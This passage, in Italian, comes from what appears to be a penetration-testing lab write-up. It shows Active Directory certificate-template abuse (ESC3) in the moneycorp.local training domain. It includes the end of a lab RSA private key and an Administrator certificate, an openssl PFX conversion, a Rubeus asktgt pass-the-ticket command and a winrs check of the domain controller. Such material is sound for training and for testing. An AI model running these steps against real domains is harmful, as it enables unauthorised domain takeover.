mEHw8S6nump2xlTng+ECPNyUv9q4Hu375ctqk53D8hzqXNM6eD3akg/OkXelpdWE
WeqYIk33/mmLMXlHQMoCFIQE4W3kCaZfnbR4qFJ5sddUve3Kz/qwYk3fAoGBANHJ
8cYKRK9TF5SUc2KtgL8lAsKxOGZt4PEa/vqz1kgninrNx4QFjq6YyEwqazQ6Qa1E
NTUqO6pDT9rBxme6CQ6zcciPuktM8jMj43XR09toDQ7RB63t9WLVC8mvX3mnp9Z/
RS0j1j+PWETjaXgs9rqfTghYUNdqgKQq/43yT0Y/AoGAFpvMobCBW1WlVAt4fpyO
F+L6ObVPQnYCg9G4j8V7wweUqk5vLB/fUXq3MYx0dYPkwifMwSyPQAuHArmpP1U6
D3SO/WSMKkOKzm8/g0pTTPSWLmEJhfpZ9ch4LSoBEmoFVP6p2L8eWgV38mN4EWnB
LB+f1LANvIvujXeokzWkZLsCgYEAp+9OeUfS/742TBwh2cYmH90SvqN7EJO404jW
v/2h9RSiB/geVJLWSvHGtSHnu2E/HeJR7YMnS/6iN+2SU4paocgHt5NGf+zSnRmH
hdM4EpTSjx/JU/P+0OTWkNawSQRqmIw85gugADVRZaPd0/O6dl376zY3UJnS7Jf3
BrwHtaUCgYEAi22df27JCTNDSUnz7NcGfJd08WxvWcYy4ytDFun4JkBEkY3XTYvW
JYaWlhTrg+cBZRQZMKct8cBoDxWToOC1gAGfKCVXfj7PTnQRMWvbAGtykNdYeZab
JCcshjlIwXEzw+C58S0dFm4kTFy47aKKIiVlQeyHR9eFaE2K4vJiJSU=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGYTCCBUmgAwIBAgITFQAAAC5S3CLYSBGLiAAAAAAALjANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNjAxMDkx
MDEwMzhaFw0yODAxMDkxMDIwMzhaMFoxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEOMAwGA1UEAxMFVXNlcnMxFjAUBgNV
BAMTDUFkbWluaXN0cmF0b3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCsy6iY5RCyYCIsra3B8ejaYeWZUjc/Y8spBzPBnMAjtZTAE/BlkWc0SQmONNk+
VbvshSXRhZCIif66JQl8X0ZqefhCXi5u0BzJZW6L9ISkORnXX1QPquvSdT6hFVbO
ur48hnRTtk1F1fd5MuU8/0P3fegf48/Q7/id/sOjU/pZVClUWEsAXniK1rBFEDgl
7dTDyUnxllo0lh9gYJkIh9vwmOUP7i+sLckVa1+Nx9x7iY63bzASz/nDmIMHHGd+
YSOQzgmqSkDl731hRMzCSzv487XrLi1jf7tdz4cvYFS353JJ7AKVQUKPHzWUfUF3
XuELgTEMCD1WPNctG7IfTSPhAgMBAAGjggMmMIIDIjA9BgkrBgEEAYI3FQcEMDAu
BiYrBgEEAYI3FQiF4ahyh8yfaOGHJoKfrlGC8vZ9gT+GtKVfh7r6GAIBZAIBCTAp
BgNVHSUEIjAgBggrBgEFBQcDBAYKKwYBBAGCNwoDBAYIKwYBBQUHAwIwDgYDVR0P
AQH/BAQDAgeAMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUHAwQwDAYKKwYBBAGC
NwoDBDAKBggrBgEFBQcDAjAdBgNVHQ4EFgQUMu8Un6tobRiLo5eXn/5h56/A14cw
HwYDVR0jBBgwFoAU0f6NCqf6tDKfNvwguPfLnmjFRe0wgdgGA1UdHwSB0DCBzTCB
yqCBx6CBxIaBwWxkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURDLUNBLENOPW1j
b3JwLWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2
aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1sb2NhbD9jZXJ0
aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
YnV0aW9uUG9pbnQwgcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEFBQcwAoaBq2xk
YXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURDLUNBLENOPUFJQSxDTj1QdWJsaWMl
MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
PW1vbmV5Y29ycCxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xh
c3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA4BgNVHREEMTAvoC0GCisGAQQBgjcU
AgOgHwwdYWRtaW5pc3RyYXRvckBtb25leWNvcnAubG9jYWwwTAYJKwYBBAGCNxkC
BD8wPaA7BgorBgEEAYI3GQIBoC0EK1MtMS01LTIxLTMzNTYwNjEyMi05NjA5MTI4
NjktMzI3OTk1MzkxNC01MDAwDQYJKoZIhvcNAQELBQADggEBANvwo0o9THejQ4/E
EoZgklAPSrFNOL3M+7I/cSn/SnYVOvm6/HC1RfzXnJ6f0tOvYqK2XNBio/g79RjV
TyXrkjtRIyxnvaafARBaJVimq0vY4z5g5UlGrR73b9E9ivuF/JyTdf2oGpwQ8ddC
SswXvRxCKQgC0mQee7cWwAM5UWRN/l2CCWRS4FLvxG/vIKFmYzsgMR2UbYiMChtW
M/8oMO/1z59WyVb9zkN+uSFvghJZ4KnHObkITUSwjU9YK98rZt5pzdtnBwgXBL0R
hWaY7itepa2wHWt7WCycICGCjdpRTTDTnpcmSowklkrVuqtgbsiJfEFr4ODN/8bs
5N4Swps=
-----END CERTIFICATE-----
```

Salviamo il file come abbiamo fatto in precedenza in esc3-EA.pem e lo convertiamo in pfx per poter usare Rubeus&#x20;

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx
```

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```

e poi verifichiamo l'accesso a <kbd>mcorp-dc</kbd>

```powershell
winrs -r:mcorp-dc cmd /c set username
```

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

